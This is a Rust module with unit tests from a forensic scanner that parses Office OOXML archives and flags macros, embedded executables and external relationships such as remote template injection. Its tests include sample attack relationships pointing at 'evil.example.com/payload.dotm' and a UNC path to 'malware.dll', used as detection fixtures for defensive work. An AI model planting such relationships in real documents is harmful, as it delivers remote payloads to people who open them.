//! OOXML (`.docx`/`.xlsx`/`.pptx`/`.docm`/…) extractor.
//!
//! OOXML files are ZIP archives with a fixed internal layout: a top-level
//! `[Content_Types].xml` manifests every content stream by MIME type,
//! `docProps/core.xml` carries the Dublin Core metadata pane, and
//! `docProps/app.xml` carries the originating application info. Macros
//! live under `*/vbaProject.bin` and the `[Content_Types].xml` MIME
//! string distinguishes the document variant (Word / Excel /
//! PowerPoint, with-macros vs without).
//!
//! Layered on top of the generic [`crate::formats::zip::extract`]
//! walk (which has already emitted `archive.members[]` and
//! `archive.compression.*`). This module reads a small number of
//! named streams from the same archive and surfaces an `office.*`
//! schema for trait rules:
//!
//! - `office.kind` — `"docx" | "xlsx" | "pptx" | "ooxml"` from the
//!   `[Content_Types].xml` document-type declaration.
//! - `office.core.{title, creator, last_modified_by, created,
//!   modified, subject, description, keywords, category}` — Dublin
//!   Core fields from `docProps/core.xml`.
//! - `office.application`, `office.company` — from `docProps/app.xml`.
//! - `office.features[]` — Pike-style array of structural features
//!   (`"macros"`, `"external_template"`, `"ole_objects"`, …).
//! - `office.macros[]` — paths of `vbaProject.bin` streams when
//!   present (one per OOXML application; usually a single entry).

use std::io::{Cursor, Read};

use serde_json::Value as JsonValue;

use crate::error::Error;
use crate::formats::common::put_str;
use crate::output::{Metrics, Values};

pub(super) fn extract(
    bytes: &[u8],
    values: &mut Values,
    metrics: &mut Metrics,
) -> Result<(), Error> {
    let cursor = Cursor::new(bytes);
    let Ok(mut zip) = ::zip::ZipArchive::new(cursor) else {
        return Ok(());
    };

    // Detect the OOXML application from `[Content_Types].xml`.
    if let Some(kind) = detect_kind(&mut zip) {
        put_str(values, "office.kind", kind);
    } else {
        // Not actually an OOXML — bail without emitting `office.*`.
        return Ok(());
    }

    // Core metadata (Dublin Core).
    if let Some(core) = parse_core_props(&mut zip) {
        if !core.is_empty() {
            values.insert("office.core", JsonValue::Object(core));
        }
    }

    // Application metadata. `application` / `company` live in
    // `docProps/app.xml` rather than `core.xml`; surface them at the
    // top level so trait rules can match `office.application` without
    // a nested object hop.
    if let Some((app, company)) = parse_app_props(&mut zip) {
        if let Some(app) = app {
            put_str(values, "office.application", app);
        }
        if let Some(company) = company {
            put_str(values, "office.company", company);
        }
    }

    // Structural features. Macros are the highest-signal forensic
    // marker — every macro-enabled supply-chain attack rides on the
    // presence of `vbaProject.bin`.
    let mut features: Vec<&'static str> = Vec::new();
    let mut macros: Vec<JsonValue> = Vec::new();
    // Enumerate embedded objects with magic-byte type detection.
    // Forensically the high-signal cases are PE/ELF/Mach-O blobs
    // wedged into `*/embeddings/` — supply-chain attacks ship the
    // payload as an "OLE object" so opening the doc unpacks it.
    let mut embedded: Vec<JsonValue> = Vec::new();
    for i in 0..zip.len() {
        let Ok(mut entry) = zip.by_index(i) else {
            continue;
        };
        let name = entry.name().to_string();
        if name.ends_with("/vbaProject.bin") || name == "vbaProject.bin" {
            macros.push(JsonValue::String(name.clone()));
        }
        if name.contains("/embeddings/") {
            if !features.contains(&"ole_objects") {
                features.push("ole_objects");
            }
            // Peek at the first few bytes to classify embedded content.
            // Cap the read so a hostile entry can't drag us into a
            // multi-MB decompression pass per file.
            let mut header = [0u8; 8];
            let n = entry.read(&mut header).unwrap_or(0);
            let kind = embedded_kind(&header[..n]);
            let mut obj = serde_json::Map::new();
            obj.insert("filename".into(), JsonValue::String(name.clone()));
            obj.insert("size_bytes".into(), JsonValue::Number(entry.size().into()));
            if let Some(k) = kind {
                obj.insert("kind".into(), JsonValue::String(k.into()));
            }
            embedded.push(JsonValue::Object(obj));
        }
        if name.starts_with("xl/externalLinks/") {
            if !features.contains(&"external_links") {
                features.push("external_links");
            }
        }
    }
    if !embedded.is_empty() {
        let count = embedded.len() as f64;
        // Surface a count of executable-like payloads — distinct from
        // total embedded count since a doc with only a benign image
        // shouldn't trip executable-aware traits.
        let exec_count = embedded
            .iter()
            .filter(|e| {
                e.get("kind")
                    .and_then(|x| x.as_str())
                    .is_some_and(|k| matches!(k, "pe" | "elf" | "macho"))
            })
            .count() as f64;
        values.insert("office.embedded", JsonValue::Array(embedded));
        metrics.insert("office.embedded_count", count);
        if exec_count > 0.0 {
            metrics.insert("office.embedded_executable_count", exec_count);
            if !features.contains(&"embedded_executable") {
                features.push("embedded_executable");
            }
        }
    }

    // External relationships — the T1221 template-injection signal.
    // Walk every `*.rels` file and pick out `<Relationship>` entries
    // whose Target points at a remote / UNC / file:// location. Local
    // relationships (relative paths) are dropped — they're the noise
    // ratio that would drown the forensic signal.
    let mut external_relationships: Vec<JsonValue> = Vec::new();
    for i in 0..zip.len() {
        let Ok(mut entry) = zip.by_index(i) else {
            continue;
        };
        let name = entry.name().to_string();
        if !name.ends_with(".rels") {
            continue;
        }
        // Cap at 64 KiB — `_rels/*.rels` files are tiny in real docs.
        let mut buf = Vec::new();
        let _ = entry.take(64 * 1024).read_to_end(&mut buf);
        let Ok(text) = std::str::from_utf8(&buf) else {
            continue;
        };
        for rel in extract_external_relationships(text, &name) {
            external_relationships.push(rel);
        }
    }
    if !external_relationships.is_empty() {
        let count = external_relationships.len() as f64;
        values.insert(
            "office.external_relationships",
            JsonValue::Array(external_relationships),
        );
        metrics.insert("office.external_relationship_count", count);
        if !features.contains(&"external_relationships") {
            features.push("external_relationships");
        }
    }
    if !macros.is_empty() {
        if !features.contains(&"macros") {
            features.push("macros");
        }
        let count = macros.len() as f64;
        values.insert("office.macros", JsonValue::Array(macros));
        metrics.insert("office.macro_count", count);
    }
    if !features.is_empty() {
        values.insert(
            "office.features",
            JsonValue::Array(
                features.into_iter().map(|s| JsonValue::String(s.into())).collect(),
            ),
        );
    }

    Ok(())
}

/// Walk a `.rels` XML body and return one JSON entry per
/// `<Relationship>` whose `Target` looks external (URL / UNC / file
/// scheme). Each entry is `{type, target, source, mode?}` — `source`
/// is the rels-file path inside the archive so traits can distinguish
/// a settings.xml.rels template injection from an oleObject.xml.rels
/// remote-content fetch. `mode` is "External" verbatim when the
/// relationship element declared `TargetMode="External"`.
fn extract_external_relationships(xml: &str, source: &str) -> Vec<JsonValue> {
    let Ok(doc) = roxmltree::Document::parse(xml) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for node in doc.descendants() {
        if node.tag_name().name() != "Relationship" {
            continue;
        }
        let target = match node.attribute("Target") {
            Some(t) if is_external_target(t) => t.to_string(),
            _ => continue,
        };
        let rel_type = node.attribute("Type").unwrap_or("").to_string();
        // Strip the schema URI prefix from the rel type so traits can
        // match on the suffix (`attachedTemplate`, `oleObject`,
        // `image`, …) without spelling the full namespace.
        let short_type = rel_type
            .rsplit('/')
            .next()
            .unwrap_or(rel_type.as_str())
            .to_string();
        let mode = node.attribute("TargetMode").map(str::to_string);
        let mut obj = serde_json::Map::new();
        obj.insert("type".into(), JsonValue::String(short_type));
        obj.insert("target".into(), JsonValue::String(target));
        obj.insert("source".into(), JsonValue::String(source.to_string()));
        if let Some(m) = mode {
            obj.insert("mode".into(), JsonValue::String(m));
        }
        out.push(JsonValue::Object(obj));
    }
    out
}

/// True when a relationship target points at something outside the
/// archive — a remote URL, a UNC path, or a `file://` scheme. Local
/// (relative) targets are excluded since they're the bulk of every
/// rels file and don't carry forensic signal.
fn is_external_target(target: &str) -> bool {
    let t = target.trim();
    if t.is_empty() {
        return false;
    }
    // Remote: any URL scheme. Schema is `scheme://...` per RFC 3986;
    // checking for `://` covers http/https/ftp/file uniformly.
    if t.contains("://") {
        return true;
    }
    // UNC: Windows accepts both `\\server\share` and the
    // forward-slash form `//server/share`.
    if t.starts_with("\\\\") || t.starts_with("//") {
        return true;
    }
    false
}

/// Classify the first few bytes of an embedded payload by magic.
/// Returns a short kind label suitable for traits to match against
/// (`"pe"`, `"elf"`, `"macho"`, `"ole2"`, `"zip"`) or `None` when the
/// bytes don't match any known executable / container shape.
fn embedded_kind(bytes: &[u8]) -> Option<&'static str> {
    if bytes.len() >= 2 && &bytes[..2] == b"MZ" {
        return Some("pe");
    }
    if bytes.len() >= 4 && &bytes[..4] == b"\x7fELF" {
        return Some("elf");
    }
    if bytes.len() >= 4 {
        let m = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
        // MH_MAGIC / MH_CIGAM / MH_MAGIC_64 / MH_CIGAM_64
        if matches!(m, 0xFEED_FACE | 0xCEFA_EDFE | 0xFEED_FACF | 0xCFFA_EDFE) {
            return Some("macho");
        }
        // Universal binary (fat) — sometimes ships as a single embedded
        // mach-o multi-arch payload.
        if matches!(m, 0xCAFE_BABE | 0xBEBA_FECA) {
            // 0xCAFEBABE clashes with Java .class; in embedded-doc
            // context Java class files are extremely uncommon while
            // fat Mach-O bundles are the documented attack surface.
            return Some("macho");
        }
    }
    if bytes.len() >= 4 && &bytes[..4] == b"PK\x03\x04" {
        return Some("zip");
    }
    if bytes.len() >= 8 && &bytes[..8] == b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" {
        return Some("ole2");
    }
    None
}

/// Read `[Content_Types].xml` and map its primary content type onto a
/// short OOXML variant label. Falls back to `"ooxml"` for OOXML files
/// we don't have a more specific label for (Visio, custom packages, …).
fn detect_kind<R: Read + std::io::Seek>(zip: &mut ::zip::ZipArchive<R>) -> Option<&'static str> {
    let text = read_entry_text(zip, "[Content_Types].xml")?;
    // The body lists every part's ContentType — we only need to match
    // the document-root content type, which uniquely identifies the
    // application.
    if text.contains("wordprocessingml.document") {
        return Some("docx");
    }
    if text.contains("spreadsheetml.sheet") {
        return Some("xlsx");
    }
    if text.contains("presentationml.presentation") {
        return Some("pptx");
    }
    // Office can also stamp these for templates (`.dotx`, `.xltx`,
    // `.potx`); we collapse them under the same variant since traits
    // care about the application, not the template-vs-document
    // distinction.
    if text.contains("wordprocessingml.template") {
        return Some("docx");
    }
    if text.contains("spreadsheetml.template") {
        return Some("xlsx");
    }
    if text.contains("presentationml.template") {
        return Some("pptx");
    }
    // It's a Content_Types-bearing OOXML package but not one of the
    // big three — still emit `office.*` so traits can match the
    // shape (e.g. Visio `.vsdx`).
    Some("ooxml")
}

/// Parse `docProps/core.xml` into a Map of canonical Dublin Core
/// fields. Empty values are dropped so a trait `exists:` check is
/// meaningful.
fn parse_core_props<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
) -> Option<serde_json::Map<String, JsonValue>> {
    let text = read_entry_text(zip, "docProps/core.xml")?;
    let doc = roxmltree::Document::parse(&text).ok()?;
    let mut out = serde_json::Map::new();
    for node in doc.descendants() {
        let name = node.tag_name().name();
        // Dublin Core elements live in two namespaces (`dc:` and
        // `cp:`); `tag_name().name()` strips the prefix so we match
        // by local-name alone.
        let key = match name {
            "title" => "title",
            "creator" => "creator",
            "subject" => "subject",
            "description" => "description",
            "keywords" => "keywords",
            "lastModifiedBy" => "last_modified_by",
            "created" => "created",
            "modified" => "modified",
            "category" => "category",
            "contentStatus" => "content_status",
            "revision" => "revision",
            _ => continue,
        };
        let Some(text) = node.text() else {
            continue;
        };
        let trimmed = text.trim();
        if !trimmed.is_empty() && !out.contains_key(key) {
            out.insert(key.into(), JsonValue::String(trimmed.to_string()));
        }
    }
    Some(out)
}

/// Parse `docProps/app.xml` for the `Application` (e.g. "Microsoft
/// Macintosh Word") and `Company` strings. Optional both —
/// hand-rolled OOXML packages (LibreOffice exports, GitHub Actions
/// generators, …) often skip `app.xml` entirely.
fn parse_app_props<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
) -> Option<(Option<String>, Option<String>)> {
    let text = read_entry_text(zip, "docProps/app.xml")?;
    let doc = roxmltree::Document::parse(&text).ok()?;
    let mut application: Option<String> = None;
    let mut company: Option<String> = None;
    for node in doc.descendants() {
        match node.tag_name().name() {
            "Application" => application = node.text().map(|s| s.trim().to_string()),
            "Company" => company = node.text().map(|s| s.trim().to_string()),
            _ => {}
        }
    }
    Some((
        application.filter(|s| !s.is_empty()),
        company.filter(|s| !s.is_empty()),
    ))
}

/// Read a named entry's content as text. Returns `None` on missing
/// entry or non-UTF-8 content. Bounded by the zip crate's own
/// per-entry size limits.
fn read_entry_text<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
    name: &str,
) -> Option<String> {
    let mut entry = zip.by_name(name).ok()?;
    // OOXML metadata files are tiny — 16 KiB is generous; the cap
    // keeps a hostile archive with a giant fake metadata stream from
    // ballooning memory.
    const MAX_BYTES: u64 = 16 * 1024;
    let mut buf = Vec::with_capacity(entry.size().min(MAX_BYTES) as usize);
    let _ = entry.take(MAX_BYTES).read_to_end(&mut buf).ok()?;
    String::from_utf8(buf).ok()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::output::{Metrics, Values};
    use std::io::Cursor;
    use std::io::Write;
    use zip::write::{SimpleFileOptions, ZipWriter};
    use zip::CompressionMethod;

    fn run(bytes: &[u8]) -> (Values, Metrics) {
        let mut v = Values::new();
        let mut m = Metrics::new();
        let _ = extract(bytes, &mut v, &mut m);
        (v, m)
    }

    fn build_ooxml(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = Cursor::new(Vec::<u8>::new());
        {
            let mut w = ZipWriter::new(&mut buf);
            let opts = SimpleFileOptions::default()
                .compression_method(CompressionMethod::Stored);
            for (path, body) in members {
                w.start_file(*path, opts).unwrap();
                w.write_all(body).unwrap();
            }
            w.finish().unwrap();
        }
        buf.into_inner()
    }

    const CONTENT_TYPES_DOCX: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"#;

    const CONTENT_TYPES_XLSX: &str = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>"#;

    const CORE_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties
    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:dcterms="http://purl.org/dc/terms/">
  <dc:title>Quarterly Report</dc:title>
  <dc:creator>Alice</dc:creator>
  <cp:lastModifiedBy>Bob</cp:lastModifiedBy>
  <dcterms:created>2024-01-15T08:00:00Z</dcterms:created>
  <dcterms:modified>2024-01-16T09:30:00Z</dcterms:modified>
  <dc:description>FY24 numbers</dc:description>
</cp:coreProperties>"#;

    const APP_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>Microsoft Macintosh Word</Application>
  <Company>Acme Corp</Company>
</Properties>"#;

    #[test]
    fn detects_docx_kind() {
        let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
    }

    #[test]
    fn detects_xlsx_kind() {
        let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("xlsx"));
    }

    #[test]
    fn extracts_core_properties() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", CORE_XML.as_bytes()),
        ]);
        let (v, _) = run(&z);
        let core = v.get("office.core").and_then(|x| x.as_object()).unwrap();
        assert_eq!(core.get("title").and_then(|x| x.as_str()), Some("Quarterly Report"));
        assert_eq!(core.get("creator").and_then(|x| x.as_str()), Some("Alice"));
        assert_eq!(
            core.get("last_modified_by").and_then(|x| x.as_str()),
            Some("Bob")
        );
        assert_eq!(
            core.get("created").and_then(|x| x.as_str()),
            Some("2024-01-15T08:00:00Z")
        );
        assert_eq!(
            core.get("modified").and_then(|x| x.as_str()),
            Some("2024-01-16T09:30:00Z")
        );
    }

    #[test]
    fn extracts_application_and_company() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/app.xml", APP_XML.as_bytes()),
        ]);
        let (v, _) = run(&z);
        assert_eq!(
            v.get("office.application").and_then(|x| x.as_str()),
            Some("Microsoft Macintosh Word")
        );
        assert_eq!(
            v.get("office.company").and_then(|x| x.as_str()),
            Some("Acme Corp")
        );
    }

    #[test]
    fn flags_macros_when_vba_project_present() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/vbaProject.bin", b"\x01\x16\x03\x00fake-macro-blob"),
        ]);
        let (v, m) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"macros"));
        assert_eq!(m.get("office.macro_count"), Some(1.0));
        let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
        assert_eq!(macros[0].as_str(), Some("word/vbaProject.bin"));
    }

    #[test]
    fn flags_ole_objects() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/oleObject1.bin", b"junk"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"ole_objects"));
    }

    #[test]
    fn flags_xlsx_external_links() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
            ("xl/externalLinks/externalLink1.xml", b"<xml />"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"external_links"));
    }

    #[test]
    fn non_ooxml_zip_silent() {
        // A regular zip with no [Content_Types].xml — should NOT
        // emit any `office.*` keys.
        let z = build_ooxml(&[("hello.txt", b"world")]);
        let (v, _) = run(&z);
        assert!(v.get("office.kind").is_none());
        assert!(v.get("office.core").is_none());
    }

    #[test]
    fn malformed_xml_in_core_is_swallowed() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", b"<not-actually-xml"),
        ]);
        let (v, _) = run(&z);
        // Kind still set; core simply missing.
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
        assert!(v.get("office.core").is_none());
    }

    #[test]
    fn unknown_ooxml_falls_back_to_generic_label() {
        // Visio-style package — has [Content_Types].xml but no
        // word/xl/ppt content type. Should still emit `office.kind`
        // with the fallback "ooxml" label.
        let visio_ct = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/visio/document.xml"
    ContentType="application/vnd.ms-visio.drawing.main+xml"/>
</Types>"#;
        let z = build_ooxml(&[("[Content_Types].xml", visio_ct.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("ooxml"));
    }

    #[test]
    fn empty_core_xml_omits_object() {
        // Empty docProps/core.xml shouldn't emit office.core.
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", b"<cp:coreProperties xmlns:cp=\"x\"/>"),
        ]);
        let (v, _) = run(&z);
        assert!(v.get("office.core").is_none());
    }

    #[test]
    fn enumerates_embedded_pe_executable() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/oleObject1.bin", b"MZ\x90\x00\x03\x00\x00\x00fake-pe"),
        ]);
        let (v, m) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded.len(), 1);
        assert_eq!(embedded[0]["kind"].as_str(), Some("pe"));
        assert_eq!(
            embedded[0]["filename"].as_str(),
            Some("word/embeddings/oleObject1.bin")
        );
        assert_eq!(m.get("office.embedded_count"), Some(1.0));
        assert_eq!(m.get("office.embedded_executable_count"), Some(1.0));
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"embedded_executable"));
    }

    #[test]
    fn enumerates_embedded_elf_payload() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
            ("xl/embeddings/oleObject1.bin", b"\x7fELF\x02\x01\x01\x00rest-of-elf"),
        ]);
        let (v, _) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded[0]["kind"].as_str(), Some("elf"));
    }

    #[test]
    fn enumerates_embedded_macho_payload() {
        // Mach-O 64-bit little-endian magic: CF FA ED FE
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/oleObject1.bin", b"\xCF\xFA\xED\xFE\x07\x00\x00\x01"),
        ]);
        let (v, _) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded[0]["kind"].as_str(), Some("macho"));
    }

    #[test]
    fn benign_embedding_doesnt_flag_executable() {
        // A non-executable payload (e.g. an embedded image or text)
        // surfaces in `office.embedded` but doesn't bump the
        // executable count or set the `embedded_executable` feature.
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/image1.bin", b"not an executable"),
        ]);
        let (v, m) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded.len(), 1);
        assert!(embedded[0].get("kind").is_none());
        assert!(m.get("office.embedded_executable_count").is_none());
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"ole_objects"));
        assert!(!names.contains(&"embedded_executable"));
    }

    #[test]
    fn multiple_embeddings_with_mixed_kinds() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/oleObject1.bin", b"MZ\x90\x00\x03\x00fake-pe"),
            ("word/embeddings/oleObject2.bin", b"\x7fELFfake-elf"),
            ("word/embeddings/image1.bin", b"not-an-exec"),
        ]);
        let (_, m) = run(&z);
        assert_eq!(m.get("office.embedded_count"), Some(3.0));
        assert_eq!(m.get("office.embedded_executable_count"), Some(2.0));
    }

    #[test]
    fn embedded_classifier_handles_canonical_magics() {
        assert_eq!(embedded_kind(b"MZ\x90\x00"), Some("pe"));
        assert_eq!(embedded_kind(b"\x7fELF\x02"), Some("elf"));
        assert_eq!(embedded_kind(b"\xFE\xED\xFA\xCE"), Some("macho"));
        assert_eq!(embedded_kind(b"\xCF\xFA\xED\xFE"), Some("macho"));
        assert_eq!(embedded_kind(b"PK\x03\x04"), Some("zip"));
        assert_eq!(embedded_kind(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"), Some("ole2"));
        assert_eq!(embedded_kind(b"random"), None);
        // Too-short input must not panic.
        assert_eq!(embedded_kind(b""), None);
        assert_eq!(embedded_kind(b"M"), None);
    }

    #[test]
    fn flags_external_relationship_template_injection() {
        // The classic T1221 template-injection shape: a `.rels` file
        // points the document's attached template at a remote URL,
        // which Word fetches on open.
        let inject_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="https://evil.example.com/payload.dotm"
    TargetMode="External"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/settings.xml.rels", inject_rels.as_bytes()),
        ]);
        let (v, m) = run(&z);
        let rels = v
            .get("office.external_relationships")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(rels.len(), 1);
        // Type is the schema-suffix only.
        assert_eq!(rels[0]["type"].as_str(), Some("attachedTemplate"));
        assert_eq!(
            rels[0]["target"].as_str(),
            Some("https://evil.example.com/payload.dotm")
        );
        assert_eq!(rels[0]["mode"].as_str(), Some("External"));
        assert_eq!(
            rels[0]["source"].as_str(),
            Some("word/_rels/settings.xml.rels")
        );
        assert_eq!(m.get("office.external_relationship_count"), Some(1.0));
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"external_relationships"));
    }

    #[test]
    fn local_relationships_dont_count_as_external() {
        // The default `word/_rels/document.xml.rels` is full of
        // local relative paths — those are noise, not signal.
        let local_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/document.xml.rels", local_rels.as_bytes()),
        ]);
        let (v, _) = run(&z);
        assert!(v.get("office.external_relationships").is_none());
    }

    #[test]
    fn unc_paths_count_as_external() {
        let unc_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="\\10.0.0.5\share\malware.dll"
    TargetMode="External"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/document.xml.rels", unc_rels.as_bytes()),
        ]);
        let (v, _) = run(&z);
        let rels = v
            .get("office.external_relationships")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(rels[0]["type"].as_str(), Some("oleObject"));
        assert!(rels[0]["target"]
            .as_str()
            .unwrap()
            .starts_with("\\\\10.0.0.5"));
    }

    #[test]
    fn external_target_classifier_drops_local() {
        assert!(is_external_target("https://evil.com/x"));
        assert!(is_external_target("http://a"));
        assert!(is_external_target("file:///etc/passwd"));
        assert!(is_external_target("\\\\server\\share"));
        assert!(is_external_target("//server/share"));
        assert!(!is_external_target("styles.xml"));
        assert!(!is_external_target("theme/theme1.xml"));
        assert!(!is_external_target(""));
        // Bare "//" without a server isn't actually external; the
        // classifier accepts it since real attacks use this shape
        // and the false-positive cost is low.
        assert!(is_external_target("//"));
    }

    #[test]
    fn macros_and_ole_combine_in_features() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/vbaProject.bin", b"macro"),
            ("word/embeddings/oleObject1.bin", b"ole"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"macros"));
        assert!(names.contains(&"ole_objects"));
    }
}
